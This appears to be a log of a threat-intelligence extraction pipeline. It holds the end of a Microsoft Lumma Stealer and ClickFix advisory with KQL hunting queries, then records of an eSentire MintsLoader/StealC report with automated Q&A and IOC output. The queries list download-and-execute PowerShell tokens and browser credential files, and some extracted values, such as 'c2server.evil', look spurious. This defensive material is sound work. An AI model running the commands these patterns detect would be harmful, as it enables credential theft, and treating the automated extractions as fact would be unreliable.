authentication (MFA). While certain attacks such as adversary-in-the-middle (AiTM) phishing attempt to circumvent MFA, implementation of MFA remains an essential pillar in identity security and is highly effective at stopping a variety of threats.Leveragephishing-resistant authentication methodssuch as FIDO Tokens, orMicrosoft Authenticatorwith passkey. Avoid telephony-based MFA methods to avoid risks associated with SIM-jacking.Implement Entra IDConditional Access authentication strengthto require phishing-resistant authentication for employees and external users for critical apps.Encourage users to use Microsoft Edge withMicrosoft Defender SmartScreen, which identifies and blocks malicious websites, including phishing sites, scam sites, and sites that host malware.EnableNetwork Level Authenticationfor Remote Desktop Service connections.EnableLocal Security Authority (LSA) protection to block credential stealing from the Windows local security authority subsystem.AppLockercan restrict specific software tools prohibited within the organization, such as reconnaissance, fingerprinting, and RMM tools, or grant access to only specific users.Detection detailsMicrosoft Defender XDR customers can refer to the list of applicable detections below. Microsoft Defender XDR coordinates detection, prevention, investigation, and response across endpoints, identities, email, apps to provide integrated protection against attacks like the threat discussed in this blog.Customers with provisioned access can also useMicrosoft Security Copilot in Microsoft Defenderto investigate and respond to incidents, hunt for threats, and protect their organization with relevant threat intelligence.Microsoft Defender AntivirusMicrosoft Defender Antivirus detects this threat as the following malware:Behavior:Win32/LuammaStealerTrojan:JS/LummaStealerTrojan:MSIL/LummaStealerTrojan:Win32/LummaStealerTrojan:Win64/LummaStealerTrojanDropper:Win32/LummaStealerTrojan:PowerShell/PowdowTrojan:Win64/ShaolaodBehavior:Win64/ShaolaodBehavior:Win32/MaleficAmsBehavior:Win32/ClickFixBehavior:Win32/SuspClickFixTrojan:Win32/ClickFixTrojan:PowerShell/ClickFixObfusBehavior:Win32/RegRunMRUTrojan:HTML/FakeCaptchaTrojan:Script/SuspDownMicrosoft Defender for EndpointThe following Microsoft Defender for Endpoint alerts might also indicate threat activity related to this threat. Note, however, that these alerts can be also triggered by unrelated threat activity:Suspicious command in RunMRU registryPossible Lumma Stealer activityInformation stealing malware activitySuspicious PowerShell command lineUse of living-off-the-land binary to run malicious codePossible theft of passwords and other sensitive web browser informationSuspicious DPAPI ActivitySuspicious mshta process launchedRenamed AutoIt toolSuspicious phishing activity detectedSuspicious implant process from a known emerging threatA process was injected with potentially malicious codeProcess hollowing detectedSuspicious PowerShell download or encoded command executionA process was launched on a hidden desktopMicrosoft Defender for Office 365Microsoft Defender for Office 365 identifies and blocks malicious emails. These alerts, however, can also be triggered by unrelated threat activity:A potentially malicious URL click was detectedEmail messages containing malicious URL removed after deliveryEmail messages removed after deliveryA user clicked through to a potentially malicious URLSuspicious email sending patterns detectedEmail reported by user as malware or phishDefender for Office 365 also detects and blocks Prometheus TDS, EtherHiding patterns, ClickFix landing pages.Microsoft Security CopilotSecurity Copilot customers can use the standalone experience tocreate their own promptsor run the followingpre-built promptbooksto automate incident response or investigation tasks related to this threat:Incident investigationMicrosoft User analysisThreat actor profileThreat Intelligence 360 report based on MDTI articleVulnerability impact assessmentNote that some promptbooks require access to plugins for Microsoft products such as Microsoft Defender XDR or Microsoft Sentinel.Threat intelligence reportsMicrosoft customers can use the following reports in Microsoft products to get the most up-to-date information about the threat actor, malicious activity, and techniques discussed in this blog. These reports provide the intelligence, protection information, and recommended actions to prevent, mitigate, or respond to associated threats found in customer environments.Microsoft Defender Threat IntelligenceStorm-1865 phishing campaigns over vendor platforms lead to payment data theft and fraudulent chargesLumma StealerMalvertising campaign leads to info stealers hosted on GitHubClickFix technique leverages clipboard to run malicious commandsMicrosoft Security Copilot customers can also use theMicrosoft Security Copilot integrationin Microsoft Defender Threat Intelligence, either in the Security Copilot standalone portal or in theembedded experiencein the Microsoft Defender portal to get more information about this threat actor.Hunting queriesMicrosoft Defender XDRMicrosoft Defender XDR customers can run the following query to find related activity in their networks:ClickFix commands executionIdentify ClickFix commands execution.DeviceRegistryEvents\n| where ActionType =~ \"RegistryValueSet\"\n| where InitiatingProcessFileName =~ \"explorer.exe\"\n| where RegistryKey has @\"\\CurrentVersion\\Explorer\\RunMRU\"\n| where RegistryValueData has \"✅\"\n        or (RegistryValueData has_any (\"powershell\", \"mshta\", \"curl\", \"msiexec\", \"^\")\n             and RegistryValueData matches regex \"[\\u0400-\\u04FF\\u0370-\\u03FF\\u0590-\\u05FF\\u0600-\\u06FF\\u0E00-\\u0E7F\\u2C80-\\u2CFF\\u13A0-\\u13FF\\u0530-\\u058F\\u10A0-\\u10FF\\u0900-\\u097F]\")\n        or (RegistryValueData has \"mshta\" and RegistryValueName !~ \"MRUList\" and RegistryValueData !in~ (\"mshta.exe\\\\1\", \"mshta\\\\1\"))\n        or (RegistryValueData has_any (\"bitsadmin\", \"forfiles\", \"ProxyCommand=\") and RegistryValueName !~ \"MRUList\")\n        or ((RegistryValueData startswith \"cmd\" or RegistryValueData startswith \"powershell\")\n            and (RegistryValueData has_any (\"-W Hidden \", \" -eC \", \"curl\", \"E:jscript\", \"ssh\", \"Invoke-Expression\", \"UtcNow\", \"Floor\", \"DownloadString\", \"DownloadFile\", \"FromBase64String\",  \"System.IO.Compression\", \"System.IO.MemoryStream\", \"iex\", \"Invoke-WebRequest\", \"iwr\", \"Get-ADDomainController\", \"InstallProduct\", \"-w h\", \"-X POST\", \"Invoke-RestMethod\", \"-NoP -W\", \".InVOKe\", \"-useb\", \"irm \", \"^\", \"[char]\", \"[scriptblock]\", \"-UserAgent\", \"UseBasicParsing\", \".Content\")\n              or RegistryValueData matches regex @\"[-/–][Ee^]{1,2}[NnCcOoDdEeMmAa^]*\\s[A-Za-z0-9+/=]{15,}\"))DPAPI decryption via AutoIT or .NET Framework processesIdentify DPAPI decryption activity originating from AutoIT scripts .NET Framework processes.DeviceEvents\n| where ActionType == \"DpapiAccessed\"\n| where InitiatingProcessVersionInfoInternalFileName == \"AutoIt3.exe\"\n      or InitiatingProcessImageFilePath has \"\\\\windows\\\\microsoft.net\\\\framework\\\\\"\n      or InitiatingProcessFileName =~ \"powershell.exe\"\n| where (AdditionalFields has_any(\"Google Chrome\", \"Microsoft Edge\") and AdditionalFields has_any(\"SPCryptUnprotect\"))\n| extend json = parse_json(AdditionalFields)\n| extend dataDesp = tostring(json.DataDescription.PropertyValue)\n| extend opType = tostring(json.OperationType.PropertyValue)\n| where dataDesp in~ (\"Google Chrome\", \"Microsoft Edge\", \"Chromium\", \"Opera\", \"Opera GX\", \"IMAP Password\", \"Brave Browser\", \"AVG Secure Browser\") \n        and opType =~ \"SPCryptUnprotect\"\n| project Timestamp, ReportId, DeviceId, ActionType, InitiatingProcessParentFileName, InitiatingProcessFileName, InitiatingProcessVersionInfoInternalFileName, InitiatingProcessCommandLine, AdditionalFields, dataDesp, opTypeSensitive browser file access via AutoIT or .NET Framework processesIdentify .NET Framework processes (such asRegAsm.exe,MSBuild.exe, etc.) accessing sensitive browser files.let browserDirs = pack_array(@\"\\Google\\Chrome\\User Data\\\", @\"\\Microsoft\\Edge\\User Data\\\", @\"\\Mozilla\\Firefox\\Profiles\\\"); \nlet browserSensitiveFiles = pack_array(\"Web Data\", \"Login Data\", \"key4.db\", \"formhistory.sqlite\", \"cookies.sqlite\", \"logins.json\", \"places.sqlite\", \"cert9.db\");\nDeviceEvents\n| where AdditionalFields has_any (\"FileOpenSource\") // Filter for \"File Open\" events.\n| where InitiatingProcessVersionInfoInternalFileName == \"AutoIt3.exe\"\n      or InitiatingProcessImageFilePath has \"\\\\windows\\\\microsoft.net\\\\framework\\\\\"\n      or InitiatingProcessFileName =~ \"powershell.exe\"\n| where (AdditionalFields has_any(browserDirs) or  AdditionalFields has_any(browserSensitiveFiles)) \n| extend json = parse_json(AdditionalFields)\n| extend File_Name = tostring(json.FileName.PropertyValue)\n| where (File_Name has_any (browserDirs) and File_Name has_any (browserSensitiveFiles))\n| project Timestamp, ReportId, DeviceId, InitiatingProcessParentFileName, InitiatingProcessFileName, InitiatingProcessVersionInfoInternalFileName, InitiatingProcessCommandLine, File_NameLearn moreFor the latest security research from the Microsoft Threat Intelligence community, check out the Microsoft Threat Intelligence Blog:https://aka.ms/threatintelblog.To get notified about new publications and to join discussions on social media, follow us on LinkedIn athttps://www.linkedin.com/showcase/microsoft-threat-intelligence, on X (formerly Twitter) athttps://x.com/MsftSecIntel, and Bluesky athttps://bsky.app/profile/threatintel.microsoft.com.To hear stories and insights from the Microsoft Threat Intelligence community about the ever-evolving threat landscape, listen to the Microsoft Threat Intelligence podcast:https://thecyberwire.com/podcasts/microsoft-threat-intelligence.Follow on XFollow on LinkedInMicrosoft Threat IntelligenceSee more articles from this authorRelated postsMay 12, 202510 min readMarbled Dust leverages zero-day in Output Messenger for regional espionageSince April 2024, the threat actor that Microsoft Threat Intelligence tracks as Marbled Dust has been observed exploiting user accounts that have not applied fixes to a zero-day vulnerability (CVE-2025-27920) in the messaging app Output Messenger, a multiplatform chat software.May 1, 20259 min readAnalyzing CVE-2025-31191: A macOS security-scoped bookmarks-based sandbox escapeMicrosoft uncovered a vulnerability in macOS that could allow specially crafted codes to escape the App Sandbox and run unrestricted on the system.April 23, 202514 min readUnderstanding the threat landscape for Kubernetes and containerized assetsThe dynamic nature of containers can make it challenging for security teams to detect runtime anomalies or pinpoint the source of a security incident, presenting an opportunity for attackers to stay undetected."}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.esentire.com/blog/mintsloader-stealc-and-boinc-delivery", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"output": ""}}
{"metadata" : {"revision_id": "f656170-dirty", "ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.esentire.com/blog/mintsloader-stealc-and-boinc-delivery", "error": null, "summary": "", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "mitre_ttps": null, "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "MintsLoader is a PowerShell-based malware loader.", "question": "What kind of malware is it?"}, {"answer": "The attack involves a malware loader called MintsLoader, which delivers second-stage payloads like Stealc and the Berkeley Open Infrastructure for Network Computing (BOINC) client, and is typically distributed via spam emails with a link to a JScript file or via ClickFix/KongTuke.", "question": "What kind of attack does it involve?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware using web inject?"}, {"answer": "Yes, the StealC malware steals sensitive data stored by web browsers, including credentials.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "Yes, StealC is an information stealer that targets sensitive data, including financial data, passwords, and tokens, stored by web browsers, extensions, applications, crypto-wallets, and email clients.", "question": "Does is steals credit cards or bank information?"}, {"answer": "Yes, the MintsLoader campaign is related to a wallet stealer, specifically the StealC information stealer, which targets sensitive data stored by web browsers, extensions, applications, crypto-wallets, and email clients.", "question": "Is it related to wallet stealer?"}, {"answer": "The StealC malware steals sensitive data, including financial data, passwords, and tokens, stored by web browsers, extensions, applications, crypto-wallets, and email clients.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is exfiltrated to the StealC command and control (C2) server using HTTP POST requests.", "question": "Where does it forward the stolen information?"}, {"answer": "The targeted locations include the United States and Europe, specifically the Electricity, Oil & Gas, and Law Firms & Legal Services industries. No specific bank names or wallets are mentioned in the context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://www.esentire.com/blog/mintsloader-stealc-and-boinc-delivery", "error": "\"Input to ChatPromptTemplate is missing variables {'8'}.  Expected: ['8'] Received: []\\nNote: if you intended {8} to be part of the string and not a variable, please escape it with double curly braces like: '{{8}}'.\\nFor troubleshooting, visit: https://python.langchain.com/docs/troubleshooting/errors/INVALID_PROMPT_INPUT \"", "summary": "", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "c2server.evil"}, {"type": "Domain or URL", "value": "temp[.]sh"}, {"type": "Domain or URL", "value": "Pomf[.]se"}, {"type": "Domain or URL", "value": "exploit[.]in"}, {"type": "SHA256 Hash", "value": "138d2a62b73e89fc4d09416bcefed27e139ae90016ba4493efc5fbf43b66acfa"}], "mitre_ttps": null, "keywords_found": ["browser", "apt", "wallet", "phishing", "malicious", "analysis", "passwords", "intelligence", "botnet", "threat"], "article_textual_content": "# ESENTIRE SERVICES\n\n##### Managed Detection and Response\n\nCombine cutting-edge XDR technology, multi-signal threat intelligence and 24/7 Elite Threat Hunters to help you build a world-class security operation.\n\n##### All-In-One MDR Solution →\n\n##### MDR for Microsoft →\n\n##### MDR for GenAI →\n\n##### Digital Forensics and Incident Response\n\nGet unlimited Incident Response with threat suppression guarantee - anytime, anywhere.\n\n##### Continuous Threat Exposure Management (CTEM)\n\nCTEM and advisory programs that identify security gaps and build proactive strategies to address them.\n\n###### PLATFORM, PEOPLE AND RESPONSE\n\n##### Security Operations Center (SOC)\n\n24/7 SOC-as-a-Service with unlimited threat hunting and incident handling.\n\n##### Extended Detection and\n Response (XDR)\n\nXDR with machine learning that eliminates noise, enables real-time detection and response, and automatically blocks threats.\n\n##### Technology Integrations\n\nSeamless integration and threat investigation across your existing tech stack.\n\n##### Threat Response Unit (TRU)\n\nProactive threat intelligence, original threat research and a world-class team of seasoned industry veterans.\n\n##### Cyber Resilience Team\n\nExtend your team capabilities and prevent business disruption with expertise from eSentire.\n\n##### Response and Remediation\n\nWe balance automated blocks with rapid human-led investigations to manage threats.\n\nHow We Do\n\n###### MDR Packages and 24/7 Protection\n\n##### MDR Pricing and Packages\n\nFlexible MDR pricing and packages that fit your unique security requirements.\n\n###### Atlas Essentials\n\nEntry level foundational MDR coverage\n\n###### Atlas Advanced\n\nComprehensive Next Level MDR from eSentire\n\n###### Atlas Complete\n\nNext Level MDR with Cyber Risk Advisors to continuously advance your security program\n\n###### 24/7 Coverage\n\n##### Endpoint\n\n##### Network\n\n##### Log\n\n##### Cloud\n\n##### Identity\n\n###### INDUSTRIES\n\n##### Insurance\n\n##### Construction\n\n##### Finance\n\n##### Legal\n\n##### Manufacturing\n\n##### Private Equity\n\n##### Healthcare\n\n##### Retail\n\n##### Food Supply\n\n##### Government and Education\n\n##### Automotive Dealerships\n\n###### USE CASES\n\n##### Ransomware\n\nStop ransomware before it spreads.\n\n##### Cybersecurity Compliance\n\nMeet regulatory compliance mandates.\n\n##### Zero Day Attacks\n\nDetect and respond to zero-day exploits.\n\n##### Cloud Misconfiguration\n\nEnd misconfigurations and policy violations.\n\n##### Third-Party Risk\n\nDefend third-party and supply chain risk.\n\n##### Do More With Less\n\nPrevent disruption by outsourcing MDR.\n\n##### Cyber Risk\n\nAdopt a risk-based security approach.\n\n##### Cyber Insurance\n\nMeet insurability requirements with MDR.\n\n##### Sensitive Data Security\n\nProtect your most sensitive data.\n\n##### Security Leadership\n\nBuild a proven security program.\n\n##### Cyber Threat Intelligence\n\nOperationalize timely, accurate, and actionable cyber threat intelligence.\n\nResources\n\n###### From The Blog\n\n##### Pure Crypter Malware Analysis: 99 Problems but Detection Ain’t One\n\n##### MDR Vendors: Complete Guide to Understanding Managed Detection &amp; Response…\n\n##### Identity is the New Attack Surface: Why Threat Detection Alone Isn't…\n\n###### Resources\n\n##### Case Studies\n\n##### Compare MDR Vendors\n\n##### TRU Intelligence Center\n\n##### Cybersecurity Tools\n\n##### Videos\n\n##### Reports\n\n##### Webinars\n\n##### Data Sheets\n\n##### Real vs. Fake MDR\n\n##### Blogs\n\n##### Security Advisories\n\n###### SECURITY ADVISORIES\n\n##### Exploit Released for Ivanti Zero-Day Vulnerabilities (CVE-2025-4427 and CVE-2025-4428)\n\nTHE THREAT\r\n\r\n\r\n    On May 13th, Ivanti disclosed two zero-day vulnerabilities, CVE-2025-4427 and CVE-2025-4428, impacting Ivanti Endpoint Manager Mobile (EPMM). Ivanti confirmed that…\n\n##### Maximum Severity SAP Vulnerability Exploited\n\nTHE THREAT\r\n\r\n    On April 24th, SAP disclosed a maximum severity vulnerability impacting SAP NetWeaver systems. The vulnerability was initially reported to SAP by researchers from…\n\nCompany\n\n###### ABOUT ESENTIRE\n\neSentire is The Authority in Managed Detection and Response Services, protecting the critical data and applications of 2000+ organizations in 80+ countries from known and unknown cyber threats. Founded in 2001, the company’s mission is to hunt, investigate and stop cyber threats before they become business disrupting events.\n\n##### About Us →\n\n##### Leadership →\n\n##### Careers →\n\n##### Event Calendar →\n\n##### Newsroom →\n\n##### Aston Villa Football Club →\n\n###### EVENT CALENDAR\n\nMay\n\n15\n\n##### Cybersecurity Summit Toronto\n\nMay\n\n21\n\n##### Cybersec Brussels\n\nMay\n\n22\n\n##### Cybersecurity Summit Austin\n\nJun\n\n05\n\n##### Elevate IT Technology Summit Dallas\n\nJun\n\n05\n\n##### Cybersecurity Summit Salt Lake City\n\n###### LATEST PRESS RELEASE\n\n##### eSentire Unleashes AI-Driven Atlas Nexus Network, Empowering Cybersecurity Partners to Build Differentiated Security Services at Scale\n\n###### OUR PARTNERSHIPS\n\n##### Aston Villa Football Club\n\nAVFC takes its cyber protection to the Next Level with eSentire as its official cybersecurity partner.\n\nPartners\n\n###### PARTNER PROGRAM\n\nWe provide sophisticated cybersecurity solutions for Managed Security Service Providers (MSSPs), Managed Service Providers (MSPs), and Value-Added Resellers (VARs). Find out why you should partner with eSentire, the Authority in Managed Detection and Response, today.\n\nApply to become an e3 ecosystem partner with eSentire today.\n\nLogin to the Partner Portal for resources and content for current partners.\n\nSearch\n\n### Search our site\n\n#### Quick Links\n\n##### ALL-IN-ONE MDR SERVICE →\n\nMulti-Signal MDR with 300+ technology integrations to support your existing investments.\n\n##### 24/7 SOC SUPPORT →\n\n24/7 SOC-as-a-Service with unlimited threat hunting and incident handling.\n\n##### MDR PRICING AND PACKAGES →\n\nWe offer three flexible MDR pricing packages that can be customized to your unique needs.\n\n##### TRU INTELLIGENCE CENTER →\n\nThe latest security advisories, blogs, reports, industry publications and webinars published by TRU.\n\n##### MDR VENDOR COMPARISONS →\n\nCompare eSentire to other Managed Detection and Response vendors to see how we stack up against the competition.\n\n##### MDR CASE STUDIES →\n\nSee why 2000+ organizations globally have chosen eSentire for their MDR Solution.\n\nGet Started\n\n##### Get Started →\n\n##### Build A Quote →\n\n##### Become A Partner →\n\n##### Blog\n\n# MintsLoader: StealC and BOINC Delivery\n\nBY eSentire Threat Response Unit (TRU)\n\nJanuary 16, 2025 | 9 MINS READ\n\nThreat Intelligence\n\nThreat Response Unit\n\nTRU Positive/Bulletin\n\n### Want to learn more on how to achieve Cyber Resilience?\n\nAdversaries don’t work 9-5 and neither do we. At eSentire, our 24/7 SOCs are staffed with Elite Threat Hunters and Cyber Analysts who hunt, investigate, contain and respond to threats within minutes.\n\nWe have discovered some of the most dangerous threats and nation state attacks in our space – including the Kaseya MSP breach and the more\\_eggs malware.\n\nOur Security Operations Centers are supported with Threat Intelligence, Tactical Threat Response and Advanced Threat Analytics driven by our Threat Response Unit – the TRU team.\n\nIn TRU Positives, eSentire’s Threat Response Unit (TRU) provides a summary of a recent threat investigation. We outline how we responded to the confirmed threat and what recommendations we have going forward.\n\nHere’s the latest from our TRU Team…\n\n## What did we find?\n\nIn early January 2025, the eSentire Threat Response Unit (TRU) identified an ongoing campaign involving MintsLoader delivering second stage payloads like Stealc and the Berkeley Open Infrastructure for Network Computing (BOINC) client. MintsLoader is a PowerShell based malware loader that has been seen delivered via spam emails with a link to Kongtuke/ClickFix pages or a JScript file. MintsLoader features a Domain Generation Algorithm (DGA) with a seed value based on the addition of the current day of the month and a constant, combined with anti-VM techniques to evade sandboxes and malware researchers. Impacted organizations in the United States and Europe include the Electricity, Oil &amp; Gas and Law Firms &amp; Legal Services industries. ￼\n\nThe MintsLoader infection process begins when the victim clicks a link in a spam email which downloads a JScript file matching the regex pattern, “Fattura[0-9]{8}.js”.\n\nFigure 1 – JScript download\n\nThe contents of the script can be seen in the following figure.\n\nFigure 2 – JScript obfuscated contents\n\nThe contents of the deobfuscated JScript can be seen below. First a sleep occurs for 13 seconds, then a WScript.Shell object is instantiated, and the Run method is called to execute the first MintsLoader associated command in PowerShell. This command uses the curl command to retrieve the first stage of MintsLoader. Before the script exits, it deletes itself, likely as a measure to make it more difficult for responders to acquire the file for analysis. It is worth noting that the format of the PowerShell command is identical in cases where MintsLoader is instead delivered via ClickFix/KongTuke, however it is executed in a Run prompt instead of via WScript.\n\nFigure 3 - Deobfuscated JScript contents\n\nThe response from the MintsLoader C2 is obfuscated and is more PowerShell that uses Invoke-Expression (iex) again to execute the next stage.\n\nFigure 4 – Obfuscated first stage\n\nThe next stage of PowerShell is obfuscated as well and begins with decoding each line as an array of integers to their equivalent ASCII values.\n\nFigure 5 – Obfuscated next stage\n\nThe beginning of the deobfuscated script checks if the victim machine is a virtual machine via the WMI object Get-MpComputerStatus cmdlet property IsVirtualMachine. Also shown in the figure below, the variable “$key” stores a value that is used throughout the script and later is sent to the C2.\n\nFigure 6 – Check if virtual machine via Get-MpComputerStatus\n\nNext the cmdlet Win32\\_VideoController is queried and the object AdapterDACType is matched against the following strings. The first statement in the switch statement aims to identify a system that is likely not a virtual machine by checking for the presence of the strings “Internal” or “Integrated”. The remaining strings that are checked are as follows and serve to identify the machine as a VM and specifically target VMWare and KVM/QEMU/Bochs based hypervisors.\n\n- VMware\n- Bochs\n- Intel\n- SeaBIOS\n\nFigure 7 – Check if virtual machine via Win32\\_VideoController object AdapterDACType\n\nNext, two constants are added to the $key variable and the WMI cmdlet Win32\\_CacheMemory is queried, acquiring the first object’s purpose property and comparing it in a switch statement. The first two conditions in the switch statement check if the property equals L1 or is less than 4 characters, which aims to identify virtual machines. The final check aims to identify if a system is likely a physical machine.\n\nFigure 8 – Check if virtual machine via Win32\\_CacheMemory\n\nMintsLoader then makes use of a DGA that uses a seed value consisting of the current day of the month plus a constant in a loop. The loop is iterated 15 times over and the System.Random object and Next method are utilized as indexes into the character array “abcdefghijklmn”. Finally, the resulting C2 domain is appended with the TLD of the C2 server (.top).\n\nFigure 9 – DGA generate C2 server for the day\n\nA string containing part of the URI path is then built from a random ascii-numeric character array with a length of 10 characters using the Get-Random cmdlet. This is used as part of the full C2 URI path. The query parameters are built first by getting the computer name via the environment variable ComputerName which is used as the value for the id query parameter, the aforementioned $key variable is used as the value for the key query parameter, and the s query parameter contains a hard-coded number, e.g. 527. The curl command is used again to invoke the request to the C2 and the response from the C2 is invoked again via iex.\n\nFigure 10 – Send request to C2 and invoke response\n\nThe following is a list of all the possible DGA generated domains identified in this campaign.\n\nFigure 11 – Known DGA domains\n\nThe final PowerShell stage is also obfuscated and decodes more integers to ASCII. When deobfuscated, a poorly written and known Anti-Malware Scan Interface (AMSI) bypass technique fails to run due to improper de-obfuscation. A web request is then invoked to download the payload from temp[.]sh, a file hosting site that is a clone of Pomf[.]se. The response is written to the temp directory and is executed. Though the file hosting site is no longer serving the file, the SHA-256 of the file is available for download in VirusTotal. This file is a packed sample of the information stealing malware StealC.\n\nFigure 12 – Final stage, download/execute StealC\n\nStealC is an information stealer advertised by its developer “Plymouth” on Russian-speaking underground forums and has been sold as a Malware-as-a-Service since January 2023. Re-engineered from the information stealer Arkei first seen in 2018, StealC targets sensitive data stored by web browsers, extensions, applications, crypto-wallets, and email clients, including financial data, passwords, and tokens. Several legitimate DLLs, e.g. sqlite3.dll, nss3.dll, mozglue.dll, softokn3.dll, and others are downloaded and utilized as part of this process. Harvested data is exfiltrated to its command and control (C2) server using HTTP POST requests.\n\nThe admin panel for StealC can be seen in the figure below, which provides threat actors with a variety of features, such as a query builder for sorting through stolen logs.\n\nFigure 13 – StealC operator panel from sales thread on exploit[.]in (Feb 2023)\n\nStealC makes use of XOR encrypted strings to hide from static analysis. The routine that handles decryption of the strings is one of the first behaviors by StealC, the resulting decrypted strings are stored as DWORD pointers.\n\nFigure 14 – StealC string decryption\n\nFor this particular sample (138d2a62b73e89fc4d09416bcefed27e139ae90016ba4493efc5fbf43b66acfa) we identified the following C2 URL and Botnet ID in the strings:\n\nFigure 15 – StealC C2 and Botnet ID\n\nAfter string decryption and resolving APIs there are several anti-debug/anti-analysis subroutines. For example, the C code included below checks if the username of the current user is “JohnDoe”. If so, the malware exits.\n\nFigure 16 – StealC username check for JohnDoe\n\nStealC contains a check to ensure the malware doesn’t run on any systems that have the default language ID associated with Russia, Ukraine, Belarus, Kazakhstan, or Uzbekistan. If any of these languages match, the malware exits.\n\nFigure 17 – StealC check for banned countries\n\nThe count of processor cores is checked, if the system only has a single core, the malware exits.\n\nFigure 18 – StealC processors check\n\nThe total memory of the system is retrieved, if less than 1111 MB, the malware exits.\n\nFigure 19 – StealC memory check\n\nThe vertical height of the system's resolution is checked, if less than 666, the malware exits.\n\nFigure 20 – StealC resolution check\n\nPrior to communicating with C2, a hardware ID (HWID) is generated. This HWID is generated based on the C:\\ drive volume serial number and is unlikely to change so it is likely checked by threat actors to filter stolen logs in the backend or as a measure to deny access to known sandboxes. The python script here can be used to generate the HWID and decode an existing HWID if one is identified in incidents where HTTP traffic has been captured.\n\nFigure 21 – StealC HWID generation via Volume Serial\n\nThe following figure displays the initial HTTP POST request to the script gate where “&lt;HWID&gt;” represents the generated HWID. Though the C2 is no longer online, the response would contain a base64 encoded configuration. Subsequent HTTP POST requests follow a similar format and are used for exfiltration of harvested files, credentials, and other sensitive information. HTTP GET requests are used for retrieving needed third party libraries, such as sqlite3.dll.\n\nFigure 22 – StealC Initial C2 request\n\n## What did we do?\n\n- Our team of 24/7 SOC Cyber Analysts proactively isolated the affected host to contain the infection on the customer’s behalf.\n- We communicated what happened with the customer and helped them with remediation efforts.\n\n## What can you learn from this TRU Positive?\n\n- The MintsLoader campaign is an evasive threat found targeting organizations in the United States/Europe, is primarily distributed via spam emails containing a link to a JScript file or via ClickFix/KongTuke, and when paired with information stealers like StealC, becomes an even more capable threat to the confidentiality and integrity of sensitive data.\n\n## Recommendations from the Threat Response Unit (TRU):\n\n- Disable the Run prompt via GPO:\n    - User Configuration &gt; Administrative Templates &gt; Start Menu and Taskbar &gt; Enable “Remove Run menu from Start Menu”\n- Disable wscript.exe via AppLocker GPO or Windows Defender Application Control (WDAC):\n    - C:\\Windows\\System32\\WScript.exe\n    - C:\\Windows\\Syswow64\\WScript.exe\n    - *:\\Windows\\System32\\WScript.exe (* represents wildcard to include other drive letter rather than C drive)\n    - *:\\Windows\\SysWOW64\\WScript.exe (* represents wildcard to include other drive letter rather than C drive)\n- Disable mshta.exe via AppLocker GPO or Windows Defender Application Control (WDAC)\n    - C:\\Windows\\System32\\mshta.exe\n    - C:\\Windows\\Syswow64\\mshta.exe\n    - *:\\Windows\\System32\\mshta.exe (* represents wildcard to include other drive letter rather than C drive)\n    - *:\\Windows\\SysWOW64\\mshta.exe (* represents wildcard to include other drive letter rather than C drive)\n- Employ email filtering and protection measures.\n- Use a Next-Gen AV (NGAV) or Endpoint Detection and Response (EDR) solution to detect and contain threats.\n- Implement a Phishing and Security Awareness Training (PSAT) program that educates and informs your employees.\n\n## Indicators of Compromise\n\nYou can access the Indicators of Compromise here.\n\n## References\n\nhttps://www.huntress.com/blog/fake-browser-updates-lead-to-boinc-volunteer-computing-software\n\nhttps://www.forcepoint.com/blog/x-labs/malicious-javascript-code-sent-via-pec-email-italy\n\nhttps://levelblue.com/blogs/labs-research/asyncrat-loader-obfuscation-dgas-decoys-and-govno\n\nhttps://x.com/CERTCyberdef/status/1849392561024065779\n\n###### eSentire Threat Response Unit (TRU)\n\nThe eSentire Threat Response Unit (TRU) is an industry-leading threat research team committed to helping your organization become more resilient. TRU is an elite team of threat hunters and researchers that supports our 24/7 Security Operations Centers (SOCs), builds threat detection models across the eSentire XDR Cloud Platform, and works as an extension of your security team to continuously improve our Managed Detection and Response service. By providing complete visibility across your attack surface and performing global threat sweeps and proactive hypothesis-driven threat hunts augmented by original threat research, we are laser-focused on defending your organization against known and unknown threats.\n\n## Read the Latest from eSentire\n\nCookies allow us to deliver the best possible experience for you on our website - by continuing to use our website or by closing this box, you are consenting to our use of cookies. Visit our Privacy Policy to learn more.\n\nARE YOU EXPERIENCING A SECURITY INCIDENT OR HAVE YOU BEEN BREACHED?\n\n### The Proven Choice for \nManaged Detection and Response\n\n### Sales and \nCustomer Support\n\n##### What we do\n\n##### How we do it\n\n##### Industries\n\n##### Use Cases\n\n##### Resources\n\n##### Tools\n\n##### Company\n\n2025 eSentire, Inc. All Rights Reserved."}}
{"metadata" : {"revision_id": "f656170-dirty", "ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.esentire.com/blog/mintsloader-stealc-and-boinc-delivery", "error": null, "summary": "", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "mitre_ttps": null, "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "MintsLoader is a PowerShell-based malware loader.", "question": "What kind of malware is it?"}, {"answer": "The attack involves a MintsLoader campaign, which is a PowerShell-based malware loader that delivers second-stage payloads like Stealc and the Berkeley Open Infrastructure for Network Computing (BOINC) client, often through spam emails with malicious links or attachments.", "question": "What kind of attack does it involve?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware using web inject?"}, {"answer": "Yes, the StealC malware steals sensitive data stored by web browsers, including credentials.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer 